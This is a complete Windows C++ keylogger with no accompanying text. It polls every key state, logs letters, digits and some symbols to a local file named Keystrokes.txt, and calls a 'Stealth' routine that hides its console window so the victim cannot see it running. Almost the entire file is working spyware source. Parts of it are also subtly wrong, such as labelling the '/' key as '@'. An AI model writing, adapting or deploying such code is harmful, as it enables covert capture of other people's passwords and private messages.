#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>

using namespace std;

void Stealth();
int Save(int key_stroke, char* file);

int main() {
    Stealth();
    cout << "Keys are being recorded. Press Ctrl+C to stop." << endl;

    char i;
    while (1) {
        for (i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767)
                Save(i, "Keystrokes.txt");
        }
    }

    return 0;
}

void Stealth() {
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}

int Save(int key_stroke, char* file) {
    if ((key_stroke == 1) || (key_stroke == 2))
        return 0;

    ofstream OUTPUT_FILE(file, ios::app);
    if (!OUTPUT_FILE.is_open()) {
        cerr << "Error opening file." << endl;
        return 1;
    }

    if (key_stroke == VK_RETURN || key_stroke == VK_SPACE)
        OUTPUT_FILE << endl;
    else if ((key_stroke >= 48 && key_stroke <= 57) || // Numbers
             (key_stroke >= 65 && key_stroke <= 90) || // Alphabets
             (key_stroke >= 97 && key_stroke <= 122) ||
             (key_stroke == VK_OEM_PERIOD) ||          // "."
             (key_stroke == VK_OEM_2))                 // "@"
        OUTPUT_FILE << char(key_stroke);

    OUTPUT_FILE.close();
    return 0;
}
